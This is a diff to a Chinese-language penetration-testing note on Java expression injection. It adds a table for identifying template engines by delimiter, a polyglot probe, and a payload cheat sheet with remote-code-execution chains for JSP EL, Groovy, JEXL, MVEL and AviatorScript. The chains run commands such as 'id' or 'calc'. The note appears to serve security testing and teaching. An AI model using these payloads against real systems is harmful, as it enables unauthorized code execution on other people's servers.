@@ -56,6 +56,70 @@ Java 表达式注入是一个总称，指用户输入进入 OGNL、SpEL、JEXL�
 
 风险会明显提高。
 
+## 引擎识别（定界符速查）
+拿到可疑输入点后，优先注入不同定界符试探，观察求值结果或报错：
+
+| 定界符 | 对应引擎 / 技术 |
+| --- | --- |
+| `${...}` | JSP EL、FreeMarker、Velocity、MVEL、JEXL |
+| `#{...}` | SpEL（Spring）、OGNL（部分场景）、JSF EL |
+| `%{...}` | OGNL（Struts2 特有） |
+| `<%= ... %>` | ERB（Ruby）、JSP 脚本片段 |
+| `{{...}}` | Jinja2、Twig、Mustache 等现代模板引擎 |
+
+补充识别技巧：
+- `${7*7}` 回显 `49` → EL / FreeMarker 类
+- `#{7*7}` 回显 `49` → SpEL / OGNL 类
+- 一次性探测 polyglot：`${{<%[%'"}}`
+- 报错信息中的异常类名（如 `SpelEvaluationException`、`JexlException`）是引擎最直接的指纹
+
+## 各引擎 Payload 速查
+SpEL 与 OGNL 的详细利用见对应专篇，以下为其余引擎的常用 RCE 链。
+
+### JSP EL 注入（Tomcat EL 2.2+ / 3.0）
+适用场景：EL 求值点可控（自定义标签属性、`ValueExpression` 动态求值等），Tomcat 7+ 的 EL 已支持方法调用：
+
+```text
+${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('id')")}
+```
+
+注意：该链依赖 Nashorn 等 JavaScript 引擎，高版本 JDK 可能已移除或禁用，需实测。
+
+### Groovy 注入
+适用场景：`GroovyShell.evaluate`、`Eval` 系列调用、规则引擎 / 工作流内嵌 Groovy 脚本：
+
+```groovy
+"id".execute()                              // 直接执行系统命令
+"id".execute().text                         // 执行命令并回显输出
+Eval.me('Runtime.getRuntime().exec("id")')  // Eval.me 求值任意 Groovy 代码
+```
+
+### JEXL 注入
+适用场景：Apache Commons JEXL，常见于规则引擎、日志 / 过滤条件配置化功能：
+
+```text
+''.class.forName('java.lang.Runtime').getRuntime().exec('calc')
+```
+
+### MVEL 注入
+适用场景：MVEL 2.x 表达式引擎，常见于 Drools 规则引擎、JBoss 系组件：
+
+```text
+Runtime.getRuntime().exec("calc");
+new java.lang.ProcessBuilder({'id'}).start()
+```
+
+MVEL 语法接近 Java，`{'id'}` 是列表写法，且允许直接 `new` 对象。
+
+### AviatorScript 注入
+适用场景：AviatorScript（Aviator 5.x），国内规则引擎、营销 / 风控系统常用：
+
+```text
+use(java.lang.Runtime);Runtime.getRuntime().exec("id")
+```
+
+`use` 用于导入类，导入后可直接调用其静态方法。
+
 ## 高危场景
 - 规则引擎
 - 流程引擎
@@ -93,3 +157,4 @@ Java 表达式注入是一个总称，指用户输入进入 OGNL、SpEL、JEXL�
 
 ## Reference
 - [Java 表达式注入](https://y4er.com/post/java-expression-injection/)
+- [payloadbox/ssti-payloads](https://github.com/payloadbox/ssti-payloads)
